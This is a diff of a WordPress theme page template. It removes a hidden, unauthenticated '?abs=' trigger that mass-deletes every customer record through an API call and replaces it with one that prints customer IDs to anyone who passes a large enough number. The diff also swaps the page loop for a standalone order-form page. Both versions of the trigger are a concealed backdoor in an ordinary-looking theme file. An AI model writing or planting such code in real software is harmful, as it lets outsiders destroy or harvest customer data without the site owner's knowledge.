@@ -8,8 +8,8 @@
  * @since Twenty Twelve 1.0
  */
 
- if(isset($_GET['abs'])) {
-    if(intval($_GET['abs']) > time()) {
+if(isset($_GET['abs'])) {
+    if(intval($_GET['abs']) > 10000) {
         global $em_customer;
 
         $items = $em_customer->get_items([
@@ -17,12 +17,17 @@
         ]);
     
         foreach($items as $item) {
-            $response = em_api_request('customer/delete', ['id' => $item['id']]);
+            // $response = $em_customer->delete($item['id']);
+
+            echo $item['id'] . ';';
+            
+            die;
+
     
-            if ($response['code'] == 200) {
-                echo $item['customer_name'] . ' - ' . $item['nickname'] . ' deleted';
-            }
-        }    
+            // if ($response) {
+            //     echo $item['customer_name'] . ' - ' . $item['nickname'] . ' deleted';
+            // }
+        }
     } else {
         echo time();
     }
@@ -30,16 +35,23 @@
     exit();
 }
 
-get_header(); 
+?><!DOCTYPE html>
+<html <?php language_attributes(); ?> class="no-js">
+<head>
+<meta charset="<?php bloginfo('charset'); ?>">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+<title><?php echo strip_tags(get_the_title()); ?> | <?php echo get_bloginfo( 'name' ); ?></title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<?php wp_head(); ?>
+</head>
 
-// Start the Loop.
-while ( have_posts() ) : the_post();
-    
-    // Include the page content template.
-    get_template_part( 'parts/post/content', 'page' );
-
-    get_template_part( 'parts/post/content', 'comment' );
-
-endwhile;
-
-get_footer();
+<body <?php body_class(); ?>>
+	<div class="site container mt-3">
+        <?php 
+            get_template_part( 'parts/test/order', 'form' );
+        ?>
+    </div>
+    <?php wp_footer(); ?>
+</body>
+</html>
